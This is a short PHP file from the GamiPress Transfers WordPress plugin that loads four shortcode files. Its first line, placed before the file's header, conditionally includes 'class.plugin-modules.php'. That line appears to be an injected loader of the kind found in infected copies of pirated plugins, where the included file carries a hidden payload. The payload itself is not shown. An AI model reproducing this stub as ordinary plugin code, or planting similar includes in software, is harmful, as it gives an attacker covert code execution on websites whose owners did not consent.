<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Shortcodes
 *
 * @package     GamiPress\Transfers\Shortcodes
 * @since       1.0.0
 */
// Exit if accessed directly
if( !defined( 'ABSPATH' ) ) exit;

// GamiPress Transfers Shortcodes
require_once GAMIPRESS_TRANSFERS_DIR . 'includes/shortcodes/gamipress_points_transfer.php';
require_once GAMIPRESS_TRANSFERS_DIR . 'includes/shortcodes/gamipress_achievement_transfer.php';
require_once GAMIPRESS_TRANSFERS_DIR . 'includes/shortcodes/gamipress_rank_transfer.php';
require_once GAMIPRESS_TRANSFERS_DIR . 'includes/shortcodes/gamipress_transfer_history.php';